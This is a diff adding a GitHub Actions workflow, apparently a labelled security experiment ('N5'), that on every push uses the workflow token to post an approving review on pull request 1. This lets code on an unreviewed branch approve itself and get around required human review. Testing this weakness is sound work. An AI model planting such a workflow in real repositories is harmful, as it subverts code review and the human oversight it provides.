@@ -1,0 +1,12 @@
+# Experiment N5: a workflow on an unreviewed branch approving someone's code PR with GITHUB_TOKEN.
+name: rogue-approver
+on: push
+permissions:
+  pull-requests: write
+jobs:
+  approve:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          GH_TOKEN: ${{ github.token }}
+        run: gh api repos/${{ github.repository }}/pulls/1/reviews -f event=APPROVE -f body="Approved by a workflow on an unreviewed branch (experiment N5)."
